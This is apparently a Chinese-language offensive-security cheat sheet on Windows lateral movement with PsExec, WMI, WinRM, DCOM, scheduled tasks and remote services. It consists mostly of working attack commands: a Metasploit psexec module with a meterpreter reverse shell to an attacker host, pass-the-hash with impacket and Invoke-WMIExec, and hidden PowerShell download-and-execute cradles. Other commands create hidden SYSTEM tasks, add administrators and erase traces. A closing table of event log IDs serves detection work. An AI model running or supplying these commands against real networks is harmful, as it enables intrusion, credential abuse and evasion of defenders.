---
id: 06-001
title: "🔁 PsExec与WMI远程执行 (PsExec & WMI Remote Execution)"
category: 横向移动
category_en: "Lateral Movement"
difficulty: ★★★
tools: "PsExec, WMI, WinRM, Impacket"
last_updated: 2025-07
tags: ["lateral-movement", "pivoting", "tunneling", "remote-execution"]
subdomain: lateral-movement
nist_csf: ["DE.CM-04", "PR.AC-05"]
mitre_attack: ["T1021", "T1570", "T1080", "T1550"]
---
# 🔁 PsExec与WMI远程执行 (PsExec & WMI Remote Execution)

## 概述
使用PsExec和WMI等Windows内置管理工具在远程系统上执行命令，实现横向移动和远程控制。

## 核心技能

### 1. PsExec基础使用

```cmd
# Sysinternals PsExec
# 基本远程命令
psexec.exe \\10.0.0.1 cmd.exe
psexec.exe \\10.0.0.1 -u DOMAIN\Administrator -p Password cmd.exe

# 使用系统账户运行
psexec.exe \\10.0.0.1 -s cmd.exe           # SYSTEM权限
psexec.exe \\10.0.0.1 -i -s cmd.exe         # 交互式SYSTEM

# 复制并执行文件
psexec.exe \\10.0.0.1 -c payload.exe        # 复制到远程并执行
psexec.exe \\10.0.0.1 -c -f payload.exe     # 强制覆盖
psexec.exe \\10.0.0.1 -d -c payload.exe     # 不等待进程结束

# 显示结果
psexec.exe \\10.0.0.1 whoami
psexec.exe \\10.0.0.1 -u Admin -p Pass ipconfig /all
psexec.exe \\10.0.0.1 net localgroup administrators

# 批量执行
psexec.exe @computers.txt -u Admin -p Pass cmd.exe /c "whoami > C:\temp\result.txt"
```

### 2. PsExec高级技术

```cmd
# Metasploit PsExec模块
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.1
set SMBUser Administrator
set SMBPass:Password123
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.50
set LPORT 4444
run

# 使用哈希传递
set SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# PsExec PowerShell payload
psexec.exe \\10.0.0.1 -s powershell.exe -EncodedCommand "BASE64_COMMAND"

# 生成编码命令
$command = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\"http://10.0.0.50/payload.ps1\");"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# 使用impacket-psexec（从Linux发起）
impacket-psexec DOMAIN/Administrator:Password@10.0.0.1
impacket-psexec DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH

# 使用SMBExec（更隐蔽，不创建服务）
impacket-smbexec DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH
```

### 3. WMI远程执行

```cmd
# wmic远程命令
wmic /node:10.0.0.1 /user:DOMAIN\Administrator /password:Password process call create "cmd.exe /c whoami > C:\temp\out.txt"

# 使用cscript/wbemtest
# 不推荐，但可用

# PowerShell WMI
# 创建进程
Invoke-WmiMethod -ComputerName 10.0.0.1 -Credential $Cred -Path win32_process -Name create -ArgumentList "notepad.exe"

# 远程查询
Get-WmiObject -ComputerName 10.0.0.1 -Class Win32_ComputerSystem
Get-WmiObject -ComputerName 10.0.0.1 -Class Win32_OperatingSystem
Get-WmiObject -ComputerName 10.0.0.1 -Class Win32_Process

# Invoke-WMIExec (使用哈希)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1')
Invoke-WMIExec -Target 10.0.0.1 -Username Administrator -Hash NTLM_HASH -Command "whoami"
```

### 4. WinRM远程执行

```cmd
# 启用WinRM
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}
winrm set winrm/config/Client @{TrustedHosts="10.0.0.1"}

# 使用winrs
winrs -r:10.0.0.1 -u:DOMAIN\Administrator -p:Password whoami
winrs -r:http://10.0.0.1:5985 -u:Admin -p:Pass ipconfig
winrs -r:https://10.0.0.1:5986 -u:Admin -p:Pass "dir C:\"

# PowerShell远程会话
$password = ConvertTo-SecureString "Password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\Administrator", $password)

# 单命令
Invoke-Command -ComputerName 10.0.0.1 -Credential $cred -ScriptBlock { whoami }

# 交互式会话
Enter-PSSession -ComputerName 10.0.0.1 -Credential $cred

# 会话重用
$session = New-PSSession -ComputerName 10.0.0.1 -Credential $cred
Invoke-Command -Session $session -ScriptBlock { net localgroup administrators user /add }
Remove-PSSession $session
```

### 5. DCOM远程执行

```powershell
# DCOM执行
$computer = "10.0.0.1"
$cred = Get-Credential

# 使用MMC应用类
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $computer, $cred))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\temp\out.txt", "7")

# 使用Excel DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", $computer, $cred))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd", "/c whoami > C:\temp\out.txt")

# 使用ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", $computer))
$com.Item().Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\temp\out.txt", "", "", 0)

# 使用ServiceForUnix (Windows Services for UNIX)
# 需要安装SFU
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Windows.Sfu.Shell", $computer))
```

### 6. 计划任务远程执行

```cmd
# 创建计划任务（远程）
schtasks /create /s 10.0.0.1 /u DOMAIN\Administrator /p Password /tn "RemoteTask" /tr "C:\Windows\System32\cmd.exe /c whoami > C:\temp\result.txt" /sc ONCE /st 00:00 /ru SYSTEM

# 立即运行
schtasks /run /s 10.0.0.1 /u DOMAIN\Administrator /p Password /tn "RemoteTask"

# 删除计划任务（清理痕迹）
schtasks /delete /s 10.0.0.1 /tn "RemoteTask" /f

# 使用PowerShell创建
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Enc BASE64"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -ComputerName 10.0.0.1 -TaskName "UpdateTask" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM"
Start-ScheduledTask -ComputerName 10.0.0.1 -TaskName "UpdateTask"
Unregister-ScheduledTask -ComputerName 10.0.0.1 -TaskName "UpdateTask" -Confirm:$false
```

### 7. Windows服务远程创建与执行

```cmd
# 创建服务（远程）
sc \\10.0.0.1 create RemoteService binpath= "cmd.exe /c whoami > C:\temp\out.txt" type= own start= demand

# 启动服务
sc \\10.0.0.1 start RemoteService

# 删除服务
sc \\10.0.0.1 delete RemoteService

# 使用PowerShell New-Service
$cred = Get-Credential
New-Service -ComputerName 10.0.0.1 -Name RemoteService -BinaryPathName "powershell.exe -Enc BASE64" -Credential $cred
Start-Service -ComputerName 10.0.0.1 -Name RemoteService
Remove-Service -ComputerName 10.0.0.1 -Name RemoteService
```

## 横向移动技术隐蔽性对比

| 技术 | 创建服务 | 写入文件 | 事件日志 | 检测难度 |
|:---|:---:|:---:|:---:|:---:|
| PsExec | ✅ | ✅ | 4624,5145,7045 | 低 |
| WMI | ❌ | ❌ | 4624,4688 | 中 |
| WinRM | ❌ | ❌ | 4624,5351 | 中-高 |
| DCOM | ❌ | ❌ | 4624,4698 | 中-高 |
| Schedule Task | ✅ | ❌ | 4698,4702 | 中 |
| Service | ✅ | ❌ | 7045 | 中 |
| SMBExec | ❌ | ✅ | 4624,5140 | 低-中 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| PsExec | Sysinternals远程执行 | https://learn.microsoft.com/en-us/sysinternals/downloads/psexec |
| impacket | 跨平台远程执行 | https://github.com/fortra/impacket |
| CrackMapExec | 横向移动自动化 | https://github.com/byt3bl33d3r/CrackMapExec |
| Evil-WinRM | WinRM客户端 | https://github.com/Hackplayers/evil-winrm |
| Invoke-TheHash | PowerShell哈希传递 | https://github.com/Kevin-Robertson/Invoke-TheHash |

## 参考资源
- [HackTricks - PsExec & WMI](https://book.hacktricks.xyz/windows-hardening/lateral-movement)
- [SANS - Lateral Movement](https://www.sans.org/white-papers/36467/)
- [Microsoft - PsExec Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- [PayloadsAllTheThings - WMI/PsExec](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Lateral%20Movement)
